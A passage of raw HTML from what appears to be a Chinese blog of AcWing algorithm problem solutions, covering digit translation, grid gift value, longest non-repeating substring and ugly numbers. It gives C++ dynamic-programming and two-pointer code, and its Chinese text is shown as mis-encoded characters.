class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š[3, 32, 321]è¾“å‡ºï¼š321323</code></pre><p><strong>æ³¨æ„</strong>ï¼šè¾“å‡ºæ•°å­—çš„æ ¼å¼ä¸ºå­—ç¬¦ä¸²ã€‚</p><h3 id="é‡å†™cmpå‡½æ•°">é‡å†™cmpå‡½æ•°</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">cmp</span><span class="params">(string &amp;s1, string &amp;s2)</span> </span>&#123;  <span class="comment">// static</span></span><br><span class="line">    <span class="keyword">return</span> s1 + s2 &lt;= s2 + s1; </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">string <span class="title">printMinNumber</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    vector&lt;string&gt; nums_strs;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: nums) nums_strs.<span class="built_in">push_back</span>(<span class="built_in">to_string</span>(x));</span><br><span class="line">    <span class="built_in">sort</span>(nums_strs.<span class="built_in">begin</span>(), nums_strs.<span class="built_in">end</span>(), cmp);  <span class="comment">// cmp</span></span><br><span class="line">    string res;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: nums_strs) res += x;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æŠŠæ•°å­—ç¿»è¯‘æˆå­—ç¬¦ä¸²"><a href="https://www.acwing.com/problem/content/55/">æŠŠæ•°å­—ç¿»è¯‘æˆå­—ç¬¦ä¸²</a></h2><p>ç»™å®šä¸€ä¸ªæ•°å­—ï¼Œæˆ‘ä»¬æŒ‰ç…§å¦‚ä¸‹è§„åˆ™æŠŠå®ƒç¿»è¯‘ä¸ºå­—ç¬¦ä¸²ï¼š</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> ç¿»è¯‘æˆ <code>a</code>ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> ç¿»è¯‘æˆ <code>b</code>ï¼Œâ€¦â€¦ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>11</mn></mrow><annotation encoding="application/x-tex">11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">11</span></span></span></span> ç¿»è¯‘æˆ <code>l</code>ï¼Œâ€¦â€¦ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>25</mn></mrow><annotation encoding="application/x-tex">25</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">25</span></span></span></span> ç¿»è¯‘æˆ <code>z</code>ã€‚</p><p>ä¸€ä¸ªæ•°å­—å¯èƒ½æœ‰å¤šä¸ªç¿»è¯‘ã€‚</p><p>ä¾‹å¦‚ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>12258</mn></mrow><annotation encoding="application/x-tex">12258</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">12258</span></span></span></span> æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span> ç§ä¸åŒçš„ç¿»è¯‘ï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ <code>bccfi</code>ã€<code>bwfi</code>ã€<code>bczi</code>ã€<code>mcfi</code> å’Œ <code>mzi</code>ã€‚</p><p>è¯·ç¼–ç¨‹å®ç°ä¸€ä¸ªå‡½æ•°ç”¨æ¥è®¡ç®—ä¸€ä¸ªæ•°å­—æœ‰å¤šå°‘ç§ä¸åŒçš„ç¿»è¯‘æ–¹æ³•ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>è¾“å…¥æ•°å­—ä½æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>101</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,101]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">101</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š&quot;12258&quot;è¾“å‡ºï¼š5</code></pre><h3 id="DP-2">DP</h3><p><strong>çŠ¶æ€è¡¨ç¤º</strong> f[i]:å‰iä½æ•°å­—æœ‰å¤šå°‘ç§ä¸åŒçš„è¡¨ç¤ºæ–¹æ³•</p><p><strong>çŠ¶æ€è®¡ç®—</strong> f[i] = f[i - 1] + f[i - 2]<br>å‰ååˆ†åˆ«å¯¹åº”å°†ç¬¬iä½æ•°å­—å•ç‹¬ç¿»è¯‘ã€ ç¬¬i-1ä½å’Œç¬¬iä½ä¸€èµ·è¿›è¡Œç¿»è¯‘(å¿…é¡»åˆæ³•:0~25ä¸”ä¸èƒ½ä¸º05ç­‰, å³å¿…é¡»10~25)</p><p><strong>è¾¹ç•Œæƒ…å†µ</strong> f[0] = 1: è®©f[1]å’Œf[2]æ•°å€¼æ­£ç¡®</p><blockquote><p>å½“ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>u</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">num</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span></span></span></span> ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo separator="true">,</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">1, 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span></span></span></span> ä½çš„ç»„æˆçš„æ•°å­— âˆˆ[10,25] æ—¶ï¼Œæ˜¾ç„¶åº”æœ‰ 2 ç§ç¿»è¯‘æ–¹æ³•ï¼Œå³ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mo>=</mo><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo>+</mo><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">dp[2] = dp[1] + dp[0] = 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span> ï¼Œè€Œæ˜¾ç„¶ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">dp[1] = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> ï¼Œå› æ­¤æ¨å‡º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">dp[0] = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> ã€‚</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">getTranslationCount</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">f</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">    f[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      f[i] = f[i - <span class="number">1</span>];</span><br><span class="line">      <span class="type">int</span> t = (i &gt;= <span class="number">2</span>) * (<span class="number">10</span> * (s[i - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) + s[i - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (t &gt;= <span class="number">10</span> &amp;&amp; t &lt;= <span class="number">25</span>) f[i] += f[i - <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f[n];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="ç¤¼ç‰©çš„æœ€å¤§ä»·å€¼"><a href="https://www.acwing.com/problem/content/56/">ç¤¼ç‰©çš„æœ€å¤§ä»·å€¼</a></h2><p>åœ¨ä¸€ä¸ª <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>Ã—</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">m \times n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> çš„æ£‹ç›˜çš„æ¯ä¸€æ ¼éƒ½æ”¾æœ‰ä¸€ä¸ªç¤¼ç‰©ï¼Œæ¯ä¸ªç¤¼ç‰©éƒ½æœ‰ä¸€å®šçš„ä»·å€¼ï¼ˆä»·å€¼å¤§äº <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>ï¼‰ã€‚</p><p>ä½ å¯ä»¥ä»æ£‹ç›˜çš„å·¦ä¸Šè§’å¼€å§‹æ‹¿æ ¼å­é‡Œçš„ç¤¼ç‰©ï¼Œå¹¶æ¯æ¬¡å‘å³æˆ–è€…å‘ä¸‹ç§»åŠ¨ä¸€æ ¼ç›´åˆ°åˆ°è¾¾æ£‹ç›˜çš„å³ä¸‹è§’ã€‚</p><p>ç»™å®šä¸€ä¸ªæ£‹ç›˜åŠå…¶ä¸Šé¢çš„ç¤¼ç‰©ï¼Œè¯·è®¡ç®—ä½ æœ€å¤šèƒ½æ‹¿åˆ°å¤šå°‘ä»·å€¼çš„ç¤¼ç‰©ï¼Ÿ</p><p><strong>æ³¨æ„ï¼š</strong></p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo separator="true">,</mo><mi>n</mi><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">m, n \gt 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>Ã—</mo><mi>n</mi><mo>â‰¤</mo><mn>1350</mn></mrow><annotation encoding="application/x-tex">m \times n \le 1350</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1350</span></span></span></span></li></ul><p><strong>æ ·ä¾‹ï¼š</strong></p><pre><code>è¾“å…¥ï¼š[  [2,3,1],  [1,7,1],  [4,6,1]]è¾“å‡ºï¼š19è§£é‡Šï¼šæ²¿ç€è·¯å¾„ 2â†’3â†’7â†’6â†’1 å¯ä»¥å¾—åˆ°æ‹¿åˆ°æœ€å¤§ä»·å€¼ç¤¼ç‰©ã€‚</code></pre><h3 id="DP-3">DP</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">getMaxValue</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;grid)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = grid.<span class="built_in">size</span>(), m = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">f</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(m + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">        f[i][j] = <span class="built_in">max</span>(f[i - <span class="number">1</span>][j], f[i][j - <span class="number">1</span>]) + grid[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f[n][m];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æœ€é•¿ä¸å«é‡å¤å­—ç¬¦çš„å­å­—ç¬¦ä¸²â˜…"><a href="https://www.acwing.com/problem/content/57/">æœ€é•¿ä¸å«é‡å¤å­—ç¬¦çš„å­å­—ç¬¦ä¸²â˜…</a></h2><p>è¯·ä»å­—ç¬¦ä¸²ä¸­æ‰¾å‡ºä¸€ä¸ªæœ€é•¿çš„ä¸åŒ…å«é‡å¤å­—ç¬¦çš„å­å­—ç¬¦ä¸²ï¼Œè®¡ç®—è¯¥æœ€é•¿å­å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚</p><p>å‡è®¾å­—ç¬¦ä¸²ä¸­åªåŒ…å«ä» <code>a</code> åˆ° <code>z</code> çš„å­—ç¬¦ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š&quot;abcabc&quot;è¾“å‡ºï¼š3</code></pre><h3 id="åŒæŒ‡é’ˆ-åˆ©ç”¨hashå¿«é€ŸæŸ¥é‡">åŒæŒ‡é’ˆ + åˆ©ç”¨hashå¿«é€ŸæŸ¥é‡</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">longestSubstringWithoutDuplication</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;  <span class="comment">// ç”¨0ä¸åŒç‰¹åˆ¤s.empty()</span></span><br><span class="line">    unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; hash;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; j &lt; s.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">      hash[s[j]]++;</span><br><span class="line">      <span class="keyword">while</span> (hash[s[j]] &gt; <span class="number">1</span>) hash[s[i++]]--;  <span class="comment">// ä¸ç”¨i &lt; j</span></span><br><span class="line">      res = <span class="built_in">max</span>(res, j - i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="ä¸‘æ•°â˜…"><a href="https://www.acwing.com/problem/content/58/">ä¸‘æ•°â˜…</a></h2><p>æˆ‘ä»¬æŠŠåªåŒ…å«è´¨å› å­ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mtext>ã€</mtext><mn>3</mn></mrow><annotation encoding="application/x-tex">2ã€3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">2</span><span class="mord cjk_fallback">ã€</span><span class="mord">3</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span> çš„æ•°ç§°ä½œä¸‘æ•°ï¼ˆUgly Numberï¼‰ã€‚</p><p>ä¾‹å¦‚ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>6</mn><mtext>ã€</mtext><mn>8</mn></mrow><annotation encoding="application/x-tex">6ã€8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">6</span><span class="mord cjk_fallback">ã€</span><span class="mord">8</span></span></span></span> éƒ½æ˜¯ä¸‘æ•°ï¼Œä½† <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>14</mn></mrow><annotation encoding="application/x-tex">14</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">14</span></span></span></span> ä¸æ˜¯ï¼Œå› ä¸ºå®ƒåŒ…å«è´¨å› å­ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span>ã€‚</p><p>æ±‚ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªä¸‘æ•°çš„å€¼ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š5è¾“å‡ºï¼š5</code></pre><p><strong>æ³¨æ„</strong>ï¼šä¹ æƒ¯ä¸Šæˆ‘ä»¬æŠŠ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> å½“åšç¬¬ä¸€ä¸ªä¸‘æ•°ã€‚</p><h3 id="é¢˜è§£-8">é¢˜è§£</h3><p>è€ƒè™‘ä¸‘æ•°é›†ä¸ºS = 1, 2, 3, 4, 5, 6, 8, 9, 10, â€¦</p><ol><li>åŒ…å«å› å­2çš„Så­é›†ä¸ºS1, åˆ™S1 / 2 = S ï¼ˆS1ä¸­å…ƒç´ å› å­åªåŒ…å«2ã€3ã€5, é™¤ä»¥ä¸€ä¸ª2ååªåŒ…å«2ã€3ã€5, å°±æ˜¯ä¸€ä¸ªä¸‘é›†ï¼‰</li><li>åŒ…å«å› å­3çš„Så­é›†ä¸ºS2, åˆ™S2 / 3 = S</li><li>åŒ…å«å› å­5çš„Så­é›†ä¸ºS3, åˆ™S3 / 5 = S</li></ol><p>è¦æ±‚å‡ºS, åªéœ€è¦å¯¹S1, S2, S3è¿›è¡Œå¤šè·¯å½’å¹¶(æ³¨æ„å»é‡)å³å¯<br>åˆ©ç”¨S1 / 2 = Sç­‰æ€§è´¨, æˆ‘ä»¬ä¸éœ€è¦çœŸçš„æŠŠS1, S2, S3æ±‚å‡ºæ¥, è€Œå¯ä»¥è¿™æ ·åš:<br>è®¾ç½®3ä¸ªæŒ‡é’ˆi,jå’Œk, 2 * q[i], 3 * q[j]å’Œ5 * q[k]æŒ‡å‘çš„å°±æ˜¯S1, S2å’ŒS3ä¸­çš„æœ€å°å…ƒç´ ã€‚</p><blockquote><p>åæ§½ï¼šè¿™ä¸€èˆ¬æ²¡åšçš„äººè°èƒ½æƒ³åˆ°ï¼Ÿ</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">getUglyNumber</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">    q.<span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (--n) &#123;  <span class="comment">// n-1æ¬¡å¾ªç¯</span></span><br><span class="line">      <span class="type">int</span> t = <span class="built_in">min</span>(<span class="number">2</span> * q[i], <span class="built_in">min</span>(<span class="number">3</span> * q[j], <span class="number">5</span> * q[k]));</span><br><span class="line">      q.<span class="built_in">push_back</span>(t);</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">2</span> * q[i] == t) i++;</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">3</span> * q[j] == t) j++;</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">5</span> * q[k] == t) k++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> q.<span class="built_in">back</span>();   <span class="comment">// ä¸èƒ½ç”¨q[n - 